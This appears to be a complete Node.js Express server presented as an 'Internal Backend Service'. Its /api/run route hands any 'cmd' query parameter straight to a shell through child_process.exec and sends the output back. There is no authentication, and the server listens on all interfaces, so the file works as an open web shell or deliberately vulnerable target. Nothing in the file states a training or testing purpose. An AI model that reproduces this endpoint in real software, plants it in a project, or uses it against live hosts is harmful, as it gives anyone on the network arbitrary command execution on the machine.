const express = require("express");
const { exec } = require("child_process");

const app = express();
const PORT = 3000;

app.get("/", (req, res) => {
  res.send("Internal Backend Service");
});

app.get("/api/run", (req, res) => {
  const { cmd } = req.query;

  if (!cmd) {
    return res.status(400).send("Parameter 'cmd' dibutuhkan!");
  }

  exec(cmd, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send(`Error: ${error.message}`);
    }
    if (stderr) {
      return res.status(500).send(`Stderr: ${stderr}`);
    }
    res.send(`<pre>${stdout}</pre>`);
  });
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Backend service listening on port ${PORT}`);
});
